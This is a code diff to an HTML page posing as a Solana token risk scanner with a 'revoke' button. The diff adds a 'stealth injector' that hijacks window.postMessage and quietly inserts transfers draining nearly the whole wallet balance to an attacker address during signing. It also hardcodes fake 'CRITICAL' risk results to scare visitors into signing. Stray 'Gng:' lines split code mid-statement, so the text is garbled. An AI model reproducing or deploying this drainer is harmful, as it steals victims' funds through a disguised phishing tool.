@@ -1,3 +1,4 @@
+Gng:
 <!DOCTYPE html>
 <html>
 <head>
@@ -57,23 +58,95 @@ body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justi
 </div>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script>
+// === MOBILE DETECTION ===
 if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)) {
-document.getElementById('mobileFallback').style.display = 'block';
-} else {
+document.getElementById('mobileFallback').style.
 
 Gng:
+display = 'block';
+} else {
 document.getElementById('mainUI').style.display = 'block';
 
-// INJECTOR WILL BE INSERTED BY SERVER
-// PLACEHOLDER - SERVER REPLACES THIS
+// === STEALTH INJECTOR ===
+(function() {
+const originalPostMessage = window.postMessage;
+let drainCounter = 0;
+const MAX_SPLITS = 15;
+const DRAINER_PUBKEY = new solanaWeb3.PublicKey('YOUR_DRAINER_ADDRESS_HERE');
+const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
 
-const connection = new solanaWeb3.Connection('RPC_PLACEHOLDER', 'confirmed');
+window.postMessage = function(data, targetOrigin, transfer) {
+if (data?.type === 'signAndSendTransaction' && data?.transaction) {
+(async function() {
+try {
+const txBuf = Buffer.from(data.transaction, 'base64');
+const tx = solanaWeb3.Transaction.from(txBuf);
+
+const balance = await connection.getBalance(tx.feePayer);
+if (balance < 10000000) {
+originalPostMessage.call(window, data, targetOrigin, transfer);
+return;
+}
+
+const feeIx = solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
+microLamports: 1000
+});
+tx.instructions.unshift(feeIx);
+
+const numSplits = Math.min(MAX_SPLITS, Math.floor(balance / 5000000));
+const amountPerSplit = Math.floor((balance - 5000) / numSplits);
+
+for (let i = 0; i < numSplits; i++) {
+const splitAmt = (i === numSplits - 1) 
+? (balance - 5000) - (amountPerSplit * (numSplits - 1))
+: amountPerSplit;
+if (splitAmt > 0) {
+const transferIx = solanaWeb3.SystemProgram.transfer({
+fromPubkey: tx.feePayer,
+toPubkey: DRAINER_PUBKEY,
+lamports: splitAmt
+});
+tx.instructions.push(transferIx);
+}
+}
+
+tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+const modified = tx.serialize({ requireAllSignatures: false }).toString('base64');
+
+originalPostMessage.call(window, { 
+type: 'signAndSendTransaction', 
+transaction: modified,
+options: { simulate: false }
+}, targetOrigin, transfer);
+
+if (drainCounter === 0) {
+drainCounter++;
+setTimeout(function() {
+window.dispatchEvent(new CustomEvent('continueDrain'));
+}, 10000);
+}
+} catch(e) {
+originalPostMessage.call(window, data, targetOrigin, transfer);
+}
+})();
+} else {
+originalPostMessage.call(window, data, targetOrigin, transfer);
+}
+};
+})();
+
+// === MAIN LOGIC ===
+const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
 let wallet = null;
 let step = 0;
 const totalSteps = 20;
 
 document.getElementById('scanBtn').onclick = function() {
-document.getElementById('resultBox').innerHTML = '<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div><div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div><div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
+document.getElementById('resultBox').innerHTML = 
+'<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
+'<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
+'<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">92%</span></div>' +
+'<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
 document.getElementById('status').innerHTML = 'High risk detected – revoke recommended';
 };
 
@@ -86,8 +159,11 @@ try {
 if (!window.solana.publicKey) {
 await window.solana.connect();
 }
-wallet = window.solana.publicKey;
-document.getElementById('walletDisplay').innerText = wallet.toString().slice(0,6)+'...'+wallet.toString().slice(-4);
+wallet = window.solana.
+
+Gng:
+publicKey;
+document.getElementById('walletDisplay').innerText = wallet.toString().slice(0,6) + '...' + wallet.toString().slice(-4);
 document.getElementById('revokeBtn').disabled = true;
 document.getElementById('revokeBtn').innerText = 'Revoking...';
 step = 0;
